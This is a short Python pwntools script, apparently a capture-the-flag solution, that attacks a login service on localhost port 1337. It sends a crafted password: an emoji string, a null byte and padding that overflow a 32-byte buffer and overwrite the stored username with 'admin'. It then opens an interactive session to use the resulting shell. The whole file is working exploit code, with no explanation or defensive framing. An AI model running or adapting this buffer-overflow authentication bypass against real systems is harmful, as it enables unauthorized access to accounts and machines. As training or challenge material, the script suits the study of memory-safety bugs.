from pwn import *

# Set up connection (replace with actual host/port)
HOST = 'localhost'  # Replace with actual target
PORT = 1337  # Replace with actual port

# Start connection
conn = remote(HOST, PORT)

# Step 1: Send dummy username that passes the check
conn.sendlineafter(b"Enter your username: ", b"guest")

# Step 2: Build payload to overflow password and overwrite username
emoji_pw = "🇦🇩🇲🇮🇳".encode('utf-8') # Actual password for admin user
padding = b"A" * (32 - len(emoji_pw + b"\x00"))       # Fill password buffer
username = b"admin\x00"   # Overwrite username with "admin"

payload = emoji_pw + b"\x00" + padding + username 

# Step 3: Send payload
conn.sendlineafter(b"Enter your password: ", payload + b'\n')

# Interact with shell if successful
conn.interactive()